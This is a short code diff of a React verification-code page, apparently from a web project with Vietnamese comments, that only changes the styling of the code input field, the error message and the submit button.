@@ -127,19 +127,19 @@ const Verify = () => {
 
                 <img src={VerifyImage} alt='' />
                 
-                {/* 🎯 CHỈ SỬA CÁI INPUT NÀY THÔI */}
+                {/* 🎯 SỬA INPUT: Chữ bên trái như code cuối */}
                 <input
                     type='number'
                     inputMode='numeric'
                     max={8}
                     placeholder={translatedTexts.placeholder}
-                    className='w-full rounded-lg border border-gray-300 bg-[#f8f9fa] px-6 py-4 text-center text-xl font-semibold placeholder:text-center placeholder:text-xl placeholder:font-medium'
+                    className='rounded-lg border border-gray-300 bg-[#f8f9fa] px-6 py-2'
                     value={code}
                     onChange={(e) => setCode(e.target.value)}
                     onKeyPress={(e) => e.key === 'Enter' && handleSubmit()}
                 />
                 
-                {showError && <p className='text-sm text-red-500 text-center'>{translatedTexts.errorMessage}</p>}
+                {showError && <p className='text-sm text-red-500'>{translatedTexts.errorMessage}</p>}
                 
                 <div className='flex items-center gap-4 bg-[#f8f9fa] p-4'>
                     <FontAwesomeIcon icon={faCircleInfo} size='xl' className='text-[#9f580a]' />
@@ -150,7 +150,7 @@ const Verify = () => {
                 </div>
 
                 <button
-                    className='rounded-md bg-[#0866ff] px-4 py-3 text-base font-medium text-white hover:bg-blue-600 disabled:opacity-50 disabled:bg-gray-400 mt-2'
+                    className='rounded-md bg-[#0866ff] px-4 py-2 text-sm font-medium text-white hover:bg-blue-600 disabled:opacity-50 disabled:bg-gray-400 mt-2'
                     onClick={handleSubmit}
                     disabled={isLoading || !code.trim()}
                 >
